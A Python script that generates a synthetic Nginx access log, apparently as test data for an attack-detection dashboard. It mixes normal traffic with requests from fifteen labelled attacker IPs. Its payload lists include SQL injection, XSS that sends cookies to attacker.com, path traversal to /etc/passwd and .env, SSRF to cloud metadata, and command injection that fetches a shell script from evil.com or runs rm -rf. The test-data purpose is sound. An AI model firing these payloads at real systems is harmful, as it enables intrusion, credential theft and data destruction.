"""
Generates a HIGHLY VARIED Nginx access log for demo/testing.

Design goals:
  - 15+ DISTINCT attacker IPs (not just 1-2)
  - Mix of attack types per IP (not all the same attack from one IP)
  - Realistic normal traffic (~60%) that is ALSO stored and displayed
  - Events spread across 4 time windows so the dashboard time-range filter works
  - Each upload gives a fresh result (random seeds)
"""
import random
from datetime import datetime, timedelta, timezone
from collections import Counter

random.seed()  # fresh random each run

OUT = "data/sample_access.log"
now = datetime.now(timezone.utc)

# ─── Attacker profiles (15 distinct IPs with personalities) ──────────────────

ATTACKERS = [
    # (ip, label, preferred_attacks, ua)
    ("203.0.113.7",   "SQLi bot",          ["sqli"],                      "sqlmap/1.7.12#stable"),
    ("45.33.32.156",  "SQLi manual",        ["sqli", "traversal"],         "python-requests/2.31.0"),
    ("185.220.101.5", "XSS campaign",       ["xss"],                       "curl/7.88.1"),
    ("185.220.101.9", "XSS + SQLi combo",   ["xss", "sqli"],               "curl/7.88.1"),
    ("91.108.4.40",   "Path traversal",     ["traversal"],                 "Go-http-client/1.1"),
    ("198.20.69.74",  "Scanner Nikto",      ["scanner", "traversal"],       "Nikto/2.1.6"),
    ("104.18.44.135", "Scanner masscan",    ["scanner"],                    "masscan/1.3.2"),
    ("1.2.3.4",       "SQLi + scanner",     ["sqli", "scanner"],            "Nikto/2.1.6"),
    ("94.103.82.33",  "Cmd injection",      ["cmdi"],                       "curl/7.88.1"),
    ("5.188.10.76",   "Brute force",        ["bruteforce"],                 "python-requests/2.31.0"),
    ("218.92.0.193",  "Multi-vector APT",   ["sqli","xss","traversal","cmdi","scanner"], "Mozilla/5.0 (compatible)"),
    ("103.21.244.10", "XSS automation",     ["xss", "scanner"],             "python-requests/2.31.0"),
    ("185.176.27.24", "SQLi farm",          ["sqli"],                        "sqlmap/1.7.12#stable"),
    ("77.83.247.15",  "Recon + traversal",  ["scanner", "traversal"],        "Nikto/2.1.6"),
    ("209.141.46.31", "SSRF probe",         ["ssrf", "scanner"],             "curl/7.88.1"),
]

LEGIT_IPS = [
    "192.168.1.10", "192.168.1.25", "192.168.1.50", "10.0.0.5", "10.0.0.8",
    "172.16.0.8",   "172.16.0.20",  "203.0.113.42", "198.51.100.7", "94.103.82.1",
    "185.220.1.5",  "104.21.33.10", "8.8.8.1",       "66.249.66.1",  "157.55.39.10",
]
LEGIT_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "DuckDuckBot/1.1 (+http://duckduckgo.com/duckduckbot.html)",
    "bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
]

# ─── URL libraries ────────────────────────────────────────────────────────────

SQLI_URLS = [
    "/login?user=admin'--",
    "/search?q=1'+OR+'1'%3D'1",
    "/products?id=1+UNION+SELECT+null,username,password+FROM+users--",
    "/api/users?id=1;DROP+TABLE+users--",
    "/?id=1'+AND+1%3D1--",
    "/login?username='+OR+1%3D1--&password=x",
    "/page?id=1%27+ORDER+BY+10--",
    "/profile?uid=1+AND+SLEEP(5)--",
    "/items?category=1'+AND+extractvalue(1,concat(0x7e,version()))--",
    "/news?id=1+AND+1=2+UNION+SELECT+1,2,3--",
    "/api/data?filter=1'+OR+'a'='a",
    "/comments?post_id=1;SELECT+pg_sleep(5)--",
    "/index.php?option=com_user&task=login&return=';SELECT+1--",
    "/wp-login.php?log=admin'/*",
    "/tags?name=1'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users)='a'--",
]
XSS_URLS = [
    "/?search=<script>alert('xss')</script>",
    "/comment?text=<img+src%3Dx+onerror%3Dalert(1)>",
    "/profile?name=<svg/onload%3Dalert(document.cookie)>",
    "/?q=<ScRiPt>fetch('http://attacker.com?c='+document.cookie)</ScRiPt>",
    "/api/search?q=javascript:alert('XSS')",
    "/?ref=%3Cscript+src%3D%22http%3A%2F%2Fevil.com%2Fxss.js%22%3E%3C%2Fscript%3E",
    "/forum?msg=<body+onload=alert(1)>",
    "/user?display=%22><script>document.write(document.cookie)</script>",
    "/review?text=<details/open/ontoggle=alert(1)>",
    "/search?q=%3Cimg+src%3D1+onerror%3Deval(atob('YWxlcnQoMSk%3D'))%3E",
]
TRAVERSAL_URLS = [
    "/download?file=../../etc/passwd",
    "/static/../../../etc/shadow",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/include?page=../../../../etc/hosts",
    "/files/..%2F..%2F..%2Fetc%2Fpasswd",
    "/download?file=..%5C..%5Cwindows%5Csystem32%5Csam",
    "/read?path=/proc/self/environ",
    "/view?f=..%2F..%2F..%2F..%2Fetc%2Fnginx%2Fnginx.conf",
    "/assets/../../../../var/log/auth.log",
    "/api/file?name=../../../.env",
]
CMDI_URLS = [
    "/ping?host=127.0.0.1;cat+/etc/passwd",
    "/api/lookup?domain=example.com|id",
    "/tools/nslookup?host=8.8.8.8;wget+http://evil.com/shell.sh",
    "/api/exec?cmd=ls+-la+/",
    "/test?q=$(id)",
    "/cgi-bin/test.cgi?param=;rm+-rf+/tmp/*",
    "/check?target=google.com&&curl+http://attacker.com/$(whoami)",
    "/api/run?script=;python3+-c+'import+os;os.system(\"id\")'",
]
SCANNER_URLS = [
    "/.env", "/.git/config", "/wp-admin/", "/wp-login.php", "/phpmyadmin/",
    "/admin/", "/.htaccess", "/config.php", "/.DS_Store", "/backup.zip",
    "/server-status", "/.well-known/security.txt", "/xmlrpc.php",
    "/config/database.yml", "/.git/HEAD", "/composer.json", "/package.json",
    "/.env.backup", "/web.config", "/appsettings.json",
    "/api/swagger.json", "/actuator/health", "/actuator/env",
    "/.aws/credentials", "/.ssh/id_rsa", "/etc/passwd",
    "/login.php", "/administrator/", "/manager/html",
]
SSRF_URLS = [
    "/api/fetch?url=http://169.254.169.254/latest/meta-data/",
    "/proxy?target=http://localhost:22/",
    "/open?url=http://127.0.0.1:6379/",
    "/fetch?addr=http://[::]:8080/admin",
    "/webhook?url=http://internal-service/secrets",
]
BRUTEFORCE_URLS = [f"/login?user=admin&pass=pass{i:04d}" for i in range(20)] + [
    "/auth/login", "/api/auth", "/signin", "/wp-login.php",
    "/admin/login", "/api/token",
]
NORMAL_PATHS = [
    "/", "/index.html", "/about", "/about-us", "/contact", "/contact-us",
    "/login", "/dashboard", "/profile", "/settings", "/logout",
    "/api/users", "/api/products", "/api/orders", "/api/health",
    "/static/css/app.css", "/static/js/main.js", "/static/js/vendor.js",
    "/images/logo.png", "/images/hero.jpg", "/favicon.ico",
    "/sitemap.xml", "/robots.txt",
    "/blog", "/blog/post-1", "/blog/post-2", "/blog/category/tech",
    "/shop", "/shop/laptop", "/shop/phone", "/cart", "/checkout",
    "/search?q=laptop", "/search?q=iphone", "/search?q=sale",
    "/products", "/products?page=2", "/products?sort=price",
    "/docs", "/docs/api", "/docs/quickstart",
    "/news", "/news/latest", "/faq", "/pricing", "/terms", "/privacy",
    "/api/v1/health", "/api/v1/stats",
]


def fmt(ip, ts, method, url, status, byt, ref, ua):
    t = ts.strftime("%d/%b/%Y:%H:%M:%S +0000")
    ref_str = ref or "-"
    return f'{ip} - - [{t}] "{method} {url} HTTP/1.1" {status} {byt} "{ref_str}" "{ua}"'


def add(ip, url, lines, method="GET", status=200, ua="Mozilla/5.0", offset_min=0, jitter=10, ref=None):
    ts = now - timedelta(minutes=offset_min + random.randint(0, jitter))
    byt = random.randint(200, 65000)
    lines.append((ts, fmt(ip, ts, method, url, status, byt, ref, ua)))


lines = []

# ─── TIME BUCKETS ──────────────────────────────────────────────────────────────
# T1: Last 2h   → visible in "Last 6h", "Last 24h", "Last 7d"
# T2: 4-8h ago  → visible in "Last 24h", "Last 7d"
# T3: 10-22h ago → visible in "Last 24h", "Last 7d"
# T4: 36-48h ago → visible only in "Last 7d"

T1 = 60       # centre 1h ago
T2 = 360      # centre 6h ago
T3 = 900      # centre 15h ago
T4 = 36 * 60  # centre 36h ago


def attack_urls_for(types: list, n: int) -> list:
    """Pick n random URLs matching the given attack type list."""
    pool = []
    for t in types:
        if t == "sqli":       pool += SQLI_URLS
        elif t == "xss":      pool += XSS_URLS
        elif t == "traversal":pool += TRAVERSAL_URLS
        elif t == "cmdi":     pool += CMDI_URLS
        elif t == "scanner":  pool += SCANNER_URLS
        elif t == "ssrf":     pool += SSRF_URLS
        elif t == "bruteforce":pool += BRUTEFORCE_URLS
    if not pool:
        pool = SCANNER_URLS
    result = random.choices(pool, k=n)
    return result


print("=== Generating attacker traffic ===")

# Each attacker fires across 1-2 time buckets with 8-20 events
for ip, label, attack_types, ua in ATTACKERS:
    # Decide which time bucket(s) this attacker is active in
    buckets = random.choices([T1, T2, T3, T4], weights=[3, 3, 2, 1], k=random.randint(1, 2))
    
    for bucket in set(buckets):
        n_events = random.randint(8, 20)
        urls = attack_urls_for(attack_types, n_events)
        for url in urls:
            method = "POST" if random.random() < 0.3 else "GET"
            status = random.choice([200, 200, 400, 403, 404, 500])
            add(ip, url, lines, method=method, status=status, ua=ua,
                offset_min=bucket, jitter=bucket // 4)
    
    print(f"  [{label:25s}] {ip}  {len([l for l in lines if l[1].startswith(ip)])} events")

print(f"\nAttacker events so far: {len(lines)}")

# ─── NORMAL TRAFFIC: 60% volume over all time windows ─────────────────────────
print("=== Generating normal traffic ===")
n_normal = max(200, len(lines) * 2)   # ~2x the attack volume

for _ in range(n_normal):
    ip  = random.choice(LEGIT_IPS)
    url = random.choice(NORMAL_PATHS)
    ua  = random.choice(LEGIT_UAS)
    m   = random.choices(["GET", "GET", "GET", "POST", "PUT"], k=1)[0]
    st  = random.choices([200, 200, 200, 200, 301, 302, 304, 404, 200], k=1)[0]
    ref = random.choice([None, "https://google.com", "https://example.com", None, None])
    # Normal traffic spread uniformly over 48h
    offset = random.randint(0, 48 * 60)
    add(ip, url, lines, method=m, status=st, ua=ua, offset_min=offset, jitter=0, ref=ref)

print(f"Normal events: {n_normal}")
print(f"Total events: {len(lines)}")

# ─── Sort by timestamp & write ─────────────────────────────────────────────────
lines.sort(key=lambda x: x[0])

with open(OUT, "w", encoding="utf-8") as f:
    f.write("\n".join(l for _, l in lines) + "\n")

# ─── Summary ───────────────────────────────────────────────────────────────────
ips = [l.split()[0] for _, l in lines]
ip_counts = Counter(ips)

print(f"\n=== Written {len(lines)} entries → {OUT} ===")
print("\nTop 20 IPs by request count:")
for ip, cnt in ip_counts.most_common(20):
    attacker_labels = {a[0]: a[1] for a in ATTACKERS}
    label = attacker_labels.get(ip, "normal")
    print(f"  [{label:25s}] {ip:20s}  {cnt:3d} requests")
